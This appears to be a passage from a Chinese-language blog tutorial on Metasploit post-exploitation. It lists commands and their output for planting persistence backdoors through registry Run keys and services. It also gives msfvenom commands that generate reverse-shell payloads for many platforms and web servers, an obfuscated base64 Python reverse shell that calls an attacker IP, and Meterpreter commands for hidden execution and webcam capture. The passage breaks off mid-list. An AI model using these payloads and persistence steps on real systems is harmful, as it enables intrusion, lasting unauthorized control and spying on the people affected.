<h3 id="4-8-植入后门-2"><a href="#4-8-植入后门-2" class="headerlink" title="4.8 植入后门"></a>4.8 植入后门</h3>Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。1.persistence启动项后门路径：metasploit/scripts/meterpreter/persistence原理是在<code>C:\Users***\AppData\Local\Temp\</code>目录下，上传一个vbs脚本，在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项，<strong>很容易被杀软拦截，官方不推荐</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">run persistence –h  #查看帮助</span><br><span class="line">run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line">#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444</span><br><span class="line">[*] Persistent agent script is 99630 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[+] Agent executed with PID 3540</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br></pre></td></tr></table></figure>

能实现同样功能的脚本还有：exploit/windows/local/persistence2.metsvc服务后门在C:\Users<em><strong>\AppData\Local\Temp\目录下，上传一个vbs脚本<br>在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项。</strong>通过服务启动，需要管理员权限，官方不推荐使用，运行失败</em>*<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –A   #自动安装后门</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run metsvc –A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">    Cannot open service manager (0x00000005)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll</span><br><span class="line">100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe</span><br><span class="line">100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe</span><br></pre></td></tr></table></figure>

三个文件上传成功，但服务没有启动起来，失败了。使用<code>-r</code>参数可卸载服务。3.persistence_exe再来看看官方推荐的东西吧<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; info post/windows/manage/persistence_exe</span><br><span class="line"></span><br><span class="line">       Name: Windows Manage Persistent EXE Payload Installer</span><br><span class="line">     Module: post/windows/manage/persistence_exe</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">Compatible session types:</span><br><span class="line">  Meterpreter</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name      Current Setting  Required  Description</span><br><span class="line">  ----      ---------------  --------  -----------</span><br><span class="line">  REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">  REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">  SESSION                    yes       The session to run this module on.</span><br><span class="line">  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This Module will upload an executable to a remote host and make it </span><br><span class="line">  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER </span><br><span class="line">  will start on user login, SYSTEM will start on system boot but </span><br><span class="line">  requires privs. SERVICE will create a new service which will start </span><br><span class="line">  the payload. Again requires privs.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/persistence_exe):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">   REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">   SESSION                    yes       The session to run this module on.</span><br><span class="line">   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br></pre></td></tr></table></figure>

此模块将可执行文件上载到远程主机并进行创建持久性。<br>涉及到四个参数<ul>
<li>REXENAME是拷贝到目标系统中的名字</li>
<li>EXEPATH是将要上传的后门在本地的位置</li>
<li>SESSION是选择运行此模块的会话</li>
<li>STARTUP是启动类型，有USER、SYSTEM、SERVICE这三种取值，USER表示为将在用户登录时启动，SYSTEM表示将在系统启动时启动(需要权限)，SERVICE表示将创建一个启动服务项(需要权限)。</li>
</ul>
尝试一下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Reading Payload from file /home/ubuntu/shell.exe</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[+] Agent executed with PID 3684</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc</span><br></pre></td></tr></table></figure>

4.registry_persistence完整路径为exploit/windows/local/registry_persistence和第一种方法类似，此模块将会安装一个payload到注册表的启动项中。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 13...</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistence</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/registry_persistence):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)</span><br><span class="line">   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)</span><br><span class="line">   CREATE_RC      true             no        Create a resource file for cleanup</span><br><span class="line">   RUN_NAME                        no        The name to use for the &#x27;Run&#x27; key. (Default: random)</span><br><span class="line">   SESSION                         yes       The session to run this module on.</span><br><span class="line">   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)</span><br><span class="line">   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13</span><br><span class="line">SESSION =&gt; 13</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Generating payload blob..</span><br><span class="line">[+] Generated payload, 6048 bytes</span><br><span class="line">[*] Root path is HKCU</span><br><span class="line">[*] Installing payload blob..</span><br><span class="line">[+] Created registry key HKCU\Software\0BaG3zDR</span><br><span class="line">[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD</span><br><span class="line">[*] Installing run key</span><br><span class="line">[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB</span><br><span class="line">[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc</span><br></pre></td></tr></table></figure>

同类型的还有其他payload，如exploit/windows/local/vss_persistence，exploit/windows/local/s4u_persistence。<h2 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164525">萌新科普 手把手教你如何用MSF进行后渗透测试 - 安全客，安全资讯平台</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/118714.html">访问的文章审核中… - FreeBuf网络安全行业门户</a>## 1. 安装运行及初始化安装<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 安装</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"></span><br><span class="line"># 安装完成后位置</span><br><span class="line"># /opt/metasploit-framework/embedded/framework/</span><br><span class="line"></span><br><span class="line"># 目录结构 </span><br><span class="line">--modules 重点看这里就行了</span><br><span class="line">  --auxiliary 主要包含辅助性脚本(扫描、嗅探、注入、爆破，漏洞挖掘)</span><br><span class="line">  --encoders 主要包含各种编码工具，以便绕过入侵检测和过滤系统</span><br><span class="line">  --exploits 漏洞利用，包含主流的漏洞利用脚本，exp命名规则:系统/服务/模块</span><br><span class="line">  --nops 绕过针对溢出攻击滑行字符串的拦截检测</span><br><span class="line">  --payloads 攻击荷载，主要在目标机器执行代码</span><br><span class="line">  --post 此目录放着msf的exploit执行成功后，向目标发送的一些功能性指令，如提权，获取hash等</span><br><span class="line">  --evasion 新增，用来生成免杀payload，类似于集成msfvenom功能</span><br><span class="line">--data 放了meterpreter ，passiveX，vnc，DLLs，等这些工具和一些用户接口代码，msfweb 和一些其他模块用到的数据文件</span><br><span class="line">--plugins 这里的模块用户需要load来加载，提供数据库连接插件和各种要用到的插件</span><br><span class="line">--scripts 这个目录下的文件大都是meterpreter这个模块利用的脚本，比如用到migrate来转移到其他进程的指令的源代码就在此</span><br><span class="line">--tools 包含一些有用的脚本和零散的工具</span><br></pre></td></tr></table></figure>

启动<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 运行</span><br><span class="line">$ msfconsole</span><br><span class="line"># 初始化数据库</span><br><span class="line">$ msfdb init</span><br><span class="line"># 重建缓存</span><br><span class="line">$ db_rebuild_cache</span><br><span class="line"># 查看数据库连接情况</span><br><span class="line">$ db_status</span><br></pre></td></tr></table></figure>

<h2 id="2-msf基本命令-3"><a href="#2-msf基本命令-3" class="headerlink" title="2. msf基本命令"></a>2. msf基本命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">show exploits – 查看所有可用的渗透攻击程序代码 </span><br><span class="line">show auxiliary – 查看所有可用的辅助攻击工具 </span><br><span class="line">show options – 查看该模块所有可用选项 </span><br><span class="line">show payloads – 查看该模块适用的所有载荷代码 </span><br><span class="line">show targets – 查看该模块适用的攻击目标类型</span><br><span class="line">search – 根据关键字搜索某模块 </span><br><span class="line">info – 显示某模块的详细信息 </span><br><span class="line">use – 进入使用某渗透攻击模块 </span><br><span class="line">back – 回退 </span><br><span class="line">set/unset – 设置/禁用模块中的某个参数 </span><br><span class="line">setg/unsetg – 设置/禁用适用于所有模块的全局参数 </span><br><span class="line">save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用</span><br></pre></td></tr></table></figure>

<h2 id="3-msfvenom生成payload-3"><a href="#3-msfvenom生成payload-3" class="headerlink" title="3 msfvenom生成payload"></a>3 msfvenom生成payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)</span><br><span class="line">-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</span><br><span class="line">-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度</span><br><span class="line">-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)</span><br><span class="line">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）</span><br><span class="line">-a, --arch       &lt;architecture&gt;  指定payload的目标架构</span><br><span class="line">    --platform   &lt;platform&gt;      指定payload的目标平台</span><br><span class="line">-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度</span><br><span class="line">-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line">-i, --iterations &lt;count&gt;         指定payload的编码次数</span><br><span class="line">-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件</span><br><span class="line">-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板</span><br><span class="line">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">    --payload-options            列举payload的标准选项</span><br><span class="line">-o, --out   &lt;path&gt;               保存payload</span><br><span class="line">-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式</span><br><span class="line">    --shellest                   最小化生成payload</span><br><span class="line">-h, --help                       查看帮助选项</span><br><span class="line">    --help-formats               查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure>

1.可执行程序Linux<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line">正向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

Windows<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

Mac<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>

执行方式：直接复制可执行程序到目标机器上执行就行了。2.Web PayloadsPHP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>

ASP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>

JSP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>

WAR<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure>

3.脚本shellPython<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>

Bash<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>

Perl<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>

执行方式：复制shell.py中的内容在linux命令行下执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#x27;.decode(&#x27;base64&#x27;))&quot;</span><br></pre></td></tr></table></figure>

4.shellcode<br>Linux Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

Windows Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

Mac Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

<h2 id="4-Meterpreter基本命令-3"><a href="#4-Meterpreter基本命令-3" class="headerlink" title="4. Meterpreter基本命令"></a>4. Meterpreter基本命令</h2>首先需要先获取meterpreter：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.81.160</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z # -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)</span><br><span class="line">jobs  # 查看后台攻击任务 </span><br><span class="line">kill &lt;id&gt;  # 停止某后台攻击任务 </span><br><span class="line">sessions -l  # (查看会话)</span><br><span class="line">sessions -i 2   # 选择会话</span><br><span class="line">sessions -k 2   # 结束会话</span><br></pre></td></tr></table></figure>

如果先获取了cmd，比如利用ms17-010，默认使用的payload返回的就是cmd。这时候我们可以使用<code>sessions-u 2</code>来将cmdshell升级成meterpreter。获取到了meterpreter，就可以进行后渗透了。<h3 id="4-1-基本系统命令-3"><a href="#4-1-基本系统命令-3" class="headerlink" title="4.1 基本系统命令"></a>4.1 基本系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># 会话管理</span><br><span class="line">background  #将当前会话放置后台</span><br><span class="line">sessions  # 查看会话</span><br><span class="line">sessions -i  # 切换会话</span><br><span class="line">quit  # 关闭当前的会话，返回msf终端</span><br><span class="line"></span><br><span class="line"># 系统设置</span><br><span class="line">sysinfo  # 查看目标机系统信息</span><br><span class="line">idletime  # 查看目标机闲置时间</span><br><span class="line">reboot/shutdown   # 重启/关机</span><br><span class="line"></span><br><span class="line"># shell</span><br><span class="line">shell  # 获得控制台权限</span><br><span class="line">irb  # 进入ruby终端</span><br><span class="line"></span><br><span class="line"># 进程迁移</span><br><span class="line">getpid    # 获取当前进程的pid</span><br><span class="line">ps   # 查看当前活跃进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line">kill &lt;pid值&gt;   #杀死进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line"></span><br><span class="line"># 执行文件</span><br><span class="line">execute #在目标机中执行文件</span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span><br><span class="line"></span><br><span class="line"># 摄像头命令</span><br><span class="line">webcam_list  #查看摄像头列表</span><br><span class="line">webcam_chat  # 查看摄像头接口</span><br><span class="line">webcam_snap   #通过摄像头拍照</span><br><span class="line">webcam_stream   